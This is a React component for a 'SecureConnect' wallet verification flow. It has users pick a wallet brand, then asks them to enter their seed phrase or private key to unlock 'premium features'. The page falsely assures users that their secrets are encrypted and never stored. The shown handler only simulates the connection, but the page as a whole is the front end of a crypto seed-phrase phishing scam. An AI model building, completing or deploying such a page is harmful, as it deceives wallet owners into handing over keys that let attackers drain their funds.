import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { ProgressIndicator } from "@/components/ui/progress-indicator";

const walletTypes = [
  "MetaMask",
  "Coinbase Wallet", 
  "WalletConnect",
  "Trust Wallet",
  "Phantom",
  "Exodus",
  "Atomic Wallet",
  "Ledger",
  "Trezor",
  "Binance Chain Wallet",
  "Rainbow Wallet",
  "Argent",
  "Gnosis Safe",
  "Other"
];

const steps = [
  { id: 1, title: "Select", icon: "wallet" },
  { id: 2, title: "Connect", icon: "key" },
  { id: 3, title: "Complete", icon: "check" }
];

export default function WalletVerification() {
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedWalletType, setSelectedWalletType] = useState("");
  const [connectionMethod, setConnectionMethod] = useState("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("");
  const [showPrivateKey, setShowPrivateKey] = useState(false);

  const handleSelectWallet = () => {
    if (!selectedWalletType) {
      return;
    }
    setCurrentStep(2);
  };

  const handleConnectWallet = async () => {
    if (connectionMethod === "seed" && !seedPhrase.trim()) {
      return;
    }

    if (connectionMethod === "private" && !privateKey.trim()) {
      return;
    }

    setIsLoading(true);
    setLoadingMessage("Processing wallet connection...");
    
    // Simulate wallet connection and address generation
    setTimeout(() => {
      // Generate a mock wallet address
      const mockAddress = "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
      setWalletAddress(mockAddress);
      setIsLoading(false);
      setCurrentStep(3);
    }, 2000);
  };

  const currentDate = new Date().toLocaleDateString();

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-slate/80 backdrop-blur-sm border-b border-muted sticky top-0 z-40">
        <div className="max-w-md mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 gradient-primary rounded-lg flex items-center justify-center">
              <Wallet className="text-white text-sm" />
            </div>
            <h1 className="text-lg font-semibold">SecureConnect</h1>
          </div>
          <Button variant="ghost" size="icon">
            <HelpCircle className="h-5 w-5" />
          </Button>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-md mx-auto px-4 py-6">
        <ProgressIndicator 
          currentStep={currentStep}
          totalSteps={3}
          steps={steps}
        />

        <AnimatePresence mode="wait">
          {/* Step 1: Select Wallet */}
          {currentStep === 1 && (
            <motion.div
              key="step-1"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <div className="w-20 h-20 gradient-primary rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <Wallet className="text-white text-2xl" />
                </div>
                <h2 className="text-2xl font-bold mb-3">Select Your Wallet</h2>
                <p className="text-muted-foreground leading-relaxed">
                  Choose your wallet type to begin the verification process. We support all major wallet applications.
                </p>
              </div>

              {/* Wallet Selection */}
              <Card className="bg-slate border-muted">
                <CardContent className="p-6">
                  <Label htmlFor="wallet-type" className="text-sm font-medium">Choose Your Wallet Type</Label>
                  <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
                    <SelectTrigger className="w-full mt-3 bg-slate-light border-muted h-12">
                      <SelectValue placeholder="Select your wallet..." />
                    </SelectTrigger>
                    <SelectContent>
                      {walletTypes.map((wallet) => (
                        <SelectItem key={wallet} value={wallet}>
                          {wallet}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </CardContent>
              </Card>

              {/* Supported Wallets Info */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Why Verify Your Wallet?</h3>
                <div className="space-y-3">
                  {[
                    "Enhanced security and fraud protection",
                    "Access to premium features and higher limits", 
                    "Priority customer support"
                  ].map((feature, index) => (
                    <div key={index} className="flex items-start space-x-3">
                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
                        <Check className="text-white text-xs" />
                      </div>
                      <span className="text-sm text-muted-foreground">{feature}</span>
                    </div>
                  ))}
                </div>
              </div>

              <Button 
                onClick={handleSelectWallet}
                disabled={!selectedWalletType}
                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                size="lg"
              >
                <ArrowRight className="mr-2 h-4 w-4" />
                Continue
              </Button>
            </motion.div>
          )}

          {/* Step 2: Connect Wallet */}
          {currentStep === 2 && (
            <motion.div
              key="step-2"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <div className="w-20 h-20 gradient-accent rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <Key className="text-white text-2xl" />
                </div>
                <h2 className="text-2xl font-bold mb-3">Connect Your {selectedWalletType}</h2>
                <p className="text-muted-foreground leading-relaxed">
                  Enter your wallet credentials to securely connect and verify ownership. Your information is encrypted and never stored.
                </p>
              </div>

              {/* Connection Method Selection */}
              <Card className="bg-slate border-muted">
                <CardContent className="p-6 space-y-4">
                  <div>
                    <Label htmlFor="connection-method" className="text-sm font-medium">Connection Method</Label>
                    <Select value={connectionMethod} onValueChange={setConnectionMethod}>
                      <SelectTrigger className="w-full mt-2 bg-slate-light border-muted">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="seed">Seed Phrase (12-24 words)</SelectItem>
                        <SelectItem value="private">Private Key</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {connectionMethod === "seed" && (
                    <div>
                      <Label htmlFor="seed-phrase" className="text-sm font-medium">Seed Phrase</Label>
                      <Textarea
                        id="seed-phrase"
                        placeholder="Enter your 12-24 word seed phrase separated by spaces..."
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        className="mt-2 bg-slate-light border-muted min-h-[120px] resize-none"
                        rows={5}
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        🔒 Your seed phrase is encrypted and never stored on our servers
                      </p>
                    </div>
                  )}

                  {connectionMethod === "private" && (
                    <div>
                      <Label htmlFor="private-key" className="text-sm font-medium">Private Key</Label>
                      <div className="relative mt-2">
                        <Input
                          id="private-key"
                          type={showPrivateKey ? "text" : "password"}
                          placeholder="Enter your private key (starts with 0x)..."
                          value={privateKey}
                          onChange={(e) => setPrivateKey(e.target.value)}
                          className="bg-slate-light border-muted pr-10"
                        />
                        <Button
                          type="button"
                          variant="ghost"
                          size="icon"
                          className="absolute right-2 top-1/2 -translate-y-1/2 h-6 w-6"
                          onClick={() => setShowPrivateKey(!showPrivateKey)}
                        >
                          {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </Button>
                      </div>
                      <p className="text-xs text-muted-foreground mt-1">
                        🔒 Your private key is encrypted and never stored on our servers
                      </p>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Security Notice */}
              <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg p-4">
                <div className="flex items-start space-x-3">
                  <Shield className="h-5 w-5 text-amber-500 mt-0.5" />
                  <div>
                    <h4 className="text-sm font-medium text-amber-500 mb-1">Security Notice</h4>
                    <p className="text-xs text-muted-foreground">
                      Only enter your credentials on trusted sites. We use bank-grade encryption to protect your information.
                    </p>
                  </div>
                </div>
              </div>

              <Button 
                onClick={handleConnectWallet}
                disabled={(connectionMethod === "seed" && !seedPhrase.trim()) || (connectionMethod === "private" && !privateKey.trim())}
                className="w-full gradient-accent text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-orange-500/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                size="lg"
              >
                <Key className="mr-2 h-4 w-4" />
                Connect Wallet
              </Button>
            </motion.div>
          )}

          {/* Step 3: Verification Complete */}
          {currentStep === 3 && (
            <motion.div
              key="step-3"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center mb-8">
                <motion.div 
                  className="w-20 h-20 gradient-success rounded-2xl flex items-center justify-center mx-auto mb-6"
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                >
                  <CheckCircle className="text-white text-2xl" />
                </motion.div>
                <h2 className="text-2xl font-bold mb-3">Verification Complete!</h2>
                <p className="text-muted-foreground leading-relaxed">
                  Your wallet has been successfully verified. You now have access to all premium features.
                </p>
              </div>

              {/* Success Details */}
              <Card className="bg-gradient-to-r from-accent/10 to-primary/10 border-accent/20">
                <CardContent className="p-6 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Verification Status</span>
                    <div className="flex items-center space-x-2">
                      <CheckCircle className="text-accent h-4 w-4" />
                      <span className="text-sm text-accent font-medium">Verified</span>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Wallet Type</span>
                    <span className="text-sm font-medium">{selectedWalletType}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Verification Date</span>
                    <span className="text-sm font-medium">{currentDate}</span>
                  </div>
                </CardContent>
              </Card>

              {/* Unlocked Features */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Unlocked Features</h3>
                <div className="space-y-3">
                  {[
                    "Higher transaction limits",
                    "Advanced trading features",
                    "Priority support access"
                  ].map((feature, index) => (
                    <div key={index} className="flex items-start space-x-3">
                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
                        <Unlock className="text-white text-xs" />
                      </div>
                      <span className="text-sm text-muted-foreground">{feature}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Action Buttons */}
              <div className="space-y-3">
                <Button 
                  className="w-full gradient-success text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-accent/25 transition-all duration-300 active:scale-95"
                  size="lg"
                >
                  <ArrowRight className="mr-2 h-4 w-4" />
                  Continue to Platform
                </Button>
                <Button 
                  variant="outline"
                  className="w-full border-muted text-muted-foreground font-medium py-3 px-6 rounded-xl hover:bg-slate-light transition-colors"
                  size="lg"
                >
                  <Download className="mr-2 h-4 w-4" />
                  Download Verification Certificate
                </Button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Loading Overlay */}
      <AnimatePresence>
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center z-50"
          >
            <Card className="bg-slate max-w-sm mx-4">
              <CardContent className="p-8 text-center">
                <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
                <h3 className="text-lg font-semibold mb-2">
                  {currentStep === 1 ? "Connecting Wallet..." : "Signing Message..."}
                </h3>
                <p className="text-muted-foreground text-sm">{loadingMessage}</p>
              </CardContent>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
